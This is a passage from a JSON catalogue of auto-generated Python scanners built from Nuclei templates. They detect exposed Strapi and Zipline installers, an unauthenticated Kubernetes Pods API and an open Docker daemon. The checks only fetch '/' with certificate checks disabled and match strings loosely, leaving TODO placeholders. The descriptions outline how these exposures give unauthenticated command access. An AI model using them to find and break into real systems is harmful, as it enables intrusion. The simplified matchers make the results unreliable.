NucleiCheck_strapi_admin_installer(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "misconfig",
          "exposure",
          "strapi",
          "install",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_zipline_installer",
        "name": "Zipline - Installer",
        "language": "Python",
        "famille": "Misconfiguration",
        "description": "Zipline installer setup was detected.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'Setup Zipline, Configuration, Create a super-admin account' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: zipline-installer\nName: Zipline - Installer\nSeverity: critical\nDescription: Zipline installer setup was detected.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_zipline_installer:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"zipline-installer\"\n    SEVERITY = \"critical\"\n    NAME = \"Zipline - Installer\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Setup Zipline, Configuration, Create a super-admin account' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Setup Zipline, Configuration, Create a super-admin account']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Zipline - Installer\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_zipline_installer(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: zipline-installer\nName: Zipline - Installer\nSeverity: critical\nDescription: Zipline installer setup was detected.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_zipline_installer:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"zipline-installer\"\n    SEVERITY = \"critical\"\n    NAME = \"Zipline - Installer\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Setup Zipline, Configuration, Create a super-admin account' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Setup Zipline, Configuration, Create a super-admin account']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Zipline - Installer\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_zipline_installer(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "misconfig",
          "setup",
          "zipline",
          "installer",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_kubernetes_pods_api",
        "name": "Kubernetes Pods - API Discovery & Remote Code Execution",
        "language": "Python",
        "famille": "Misconfiguration",
        "description": "A Kubernetes Pods API was discovered. When the service port is available, unauthenticated users can execute commands inside the container.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'apiVersion' | mot(s) 'application/json' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: kubernetes-pods-api\nName: Kubernetes Pods - API Discovery & Remote Code Execution\nSeverity: critical\nDescription: A Kubernetes Pods API was discovered. When the service port is available, unauthenticated users can execute commands inside the container.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_kubernetes_pods_api:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"kubernetes-pods-api\"\n    SEVERITY = \"critical\"\n    NAME = \"Kubernetes Pods - API Discovery & Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'apiVersion' | mot(s) 'application/json' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['apiVersion', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Kubernetes Pods - API Discovery & Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_kubernetes_pods_api(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: kubernetes-pods-api\nName: Kubernetes Pods - API Discovery & Remote Code Execution\nSeverity: critical\nDescription: A Kubernetes Pods API was discovered. When the service port is available, unauthenticated users can execute commands inside the container.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_kubernetes_pods_api:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"kubernetes-pods-api\"\n    SEVERITY = \"critical\"\n    NAME = \"Kubernetes Pods - API Discovery & Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'apiVersion' | mot(s) 'application/json' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['apiVersion', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Kubernetes Pods - API Discovery & Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_kubernetes_pods_api(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "k8",
          "unauth",
          "kubernetes",
          "devops",
          "misconfig",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_misconfigured_docker",
        "name": "Docker Container - Misconfiguration Exposure",
        "language": "Python",
        "famille": "Misconfiguration",
        "description": "A Docker container misconfiguration was discovered. The Docker daemon can listen for Docker Engine API requests via three different types of Socket - unix, tcp, and fd. With tcp enabled, the default setup provides un-encrypted and un-authenticated direct access to the Docker daemon. It is conventional to use port 2375 for un-encrypted, and port 2376 for encrypted communication with the daemon.",
        "severity": "critical",
        "detection": "[AND] mot(s) '\"ParentId\":, \"Containers\":, \"Labels\":' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: misconfigured-docker\nName: Docker Container - Misconfiguration Exposure\nSeverity: critical\nDescription: A Docker container misconfiguration was discovered. The Docker daemon can listen for Docker Engine API requests via three different types of Socket - unix, tcp, and fd. With tcp enabled, the default setup provides un-encrypted and un-authenticated direct access to the Docker daemon. It is conventional to use port 2375 for un-encrypted, and port 2376 for encrypted communication with the daemon.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_misconfigured_docker:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"misconfigured-docker\"\n    SEVERITY = \"critical\"\n    NAME = \"Docker Container - Misconfiguration Exposure\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"ParentId\":, \"Containers\":, \"Labels\":\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['\"ParentId\":, \"Containers\":, \"Labels\":']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Docker Container - Misconfiguration Exposure\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_misconfigured_docker(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
